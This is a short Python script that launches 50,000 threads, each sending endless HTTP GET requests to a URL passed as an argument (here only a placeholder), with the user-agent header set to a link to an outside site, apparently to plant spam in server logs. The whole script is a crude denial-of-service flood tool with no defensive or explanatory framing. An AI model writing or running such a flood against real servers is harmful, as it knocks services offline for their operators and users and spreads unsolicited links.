import threading
import requests
def run(url):
    while True:
        response = requests.get(url, headers={'user-agent': 'https://5gajv.top/h/%E5%A4%A7%E9%99%86/'})
for i in range(50000): threading.Thread(target=run, args=('?',)).start()